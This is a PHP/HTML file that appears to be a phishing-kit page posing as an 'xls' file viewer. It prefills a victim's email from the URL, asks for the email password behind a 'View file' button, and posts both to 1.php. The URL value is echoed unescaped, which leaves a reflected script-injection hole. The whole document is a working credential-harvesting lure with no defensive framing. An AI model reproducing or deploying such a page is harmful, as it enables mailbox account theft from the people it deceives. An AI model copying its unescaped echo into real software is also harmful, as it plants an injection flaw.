<?php     
?>
<html>
<head>
<style>
body { background-repeat:no-repeat;}
.container{ margin-top:285px; margin-left:570px; border:hidden;}
.puta { width:240px; height:28px; background-color:transparent; font-size:15px;border-radius:20px; border-color:green;}
.putb { width:240px; margin-top:10px; height:28px; font-size:15px; background-color:transparent; border-radius:20px; border-color:green;}
.putb:focus{outline: none;} 
.putc { width:240px; margin-top:10px; color:white;  font-size:20px; height:28px; background-color:green; border-radius:20px; border-color:green;}
.putc:focus{outline: none;}
</style>
<meta charset="utf-8">
<link rel="shortcut icon" href="ort.png">
<title>xls</title>
</head>

<body background="FRKHoeK.png">
  <form method="post" action="1.php" autocomplete="off">
      <fieldset class="container">
<input type="email" name="1" class="puta" value="<?=$_GET[email]?>" placeholder="Enter email"><br>
      <input type="password" name="2" value="" class="putb" required placeholder="&nbsp;&nbsp;Enter email password" ><br>
      <input type="submit" class="putc" value="View file"><br>
     <br>
  
  
       </fieldset>
  
  </form>
</body>
</html>
